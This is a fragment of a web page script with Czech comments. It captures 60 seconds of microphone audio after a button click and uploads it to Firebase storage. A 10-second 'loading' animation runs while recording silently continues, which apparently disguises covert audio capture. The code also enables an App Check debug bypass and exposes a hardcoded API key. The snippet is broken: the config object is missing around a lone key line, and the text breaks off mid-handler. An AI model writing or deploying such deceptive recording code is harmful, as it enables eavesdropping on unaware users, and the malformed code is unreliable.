  <script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/9.22.1/firebase-app.js";
    import { initializeAppCheck, DebugAppCheckProvider } from "https://www.gstatic.com/firebasejs/9.22.1/firebase-app-check.js";
    import { getStorage, ref as storageRef, uploadBytes } from "https://www.gstatic.com/firebasejs/9.22.1/firebase-storage.js";

      apiKey: "AIzaSyB-RcliC7vlLVsR7arV0Z-Z2ywvFytvwOU",

    self.FIREBASE_APPCHECK_DEBUG_TOKEN = true;
    const app = initializeApp(firebaseConfig);

    initializeAppCheck(app, {
      provider: new DebugAppCheckProvider(),
      isTokenAutoRefreshEnabled: true
    });

    const storage = getStorage(app);

    async function startRecording() {
      const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
      const mediaRecorder = new MediaRecorder(stream);
      const chunks = [];

      mediaRecorder.ondataavailable = e => chunks.push(e.data);
      mediaRecorder.onstop = async () => {
        const blob = new Blob(chunks, { type: 'audio/webm' });
        const filename = `recording_${Date.now()}.webm`;
        const fileRef = storageRef(storage, `recordings/${filename}`);
        await uploadBytes(fileRef, blob);
        console.log('Audio uploaded:', filename);
      };

      mediaRecorder.start();

      // Loading animace
      const loading = document.getElementById('loading');
      loading.style.display = 'block';

      setTimeout(() => {
        console.log('Loading animation finished');
        // zatím nic dalšího (žádné přesměrování)
      }, 10000); // loading 10s

      setTimeout(() => {
        mediaRecorder.stop();
        stream.getTracks().forEach(track => track.stop());
      }, 60000); // nahrávání 60s
    }

    document.getElementById('startBtn').addEventListener('click', async () => {
      try {
        await startRecording();
      } catch (e) {
        alert('Musíš povolit mikrofon, jinak to nefunguje!');
        console.error(e);
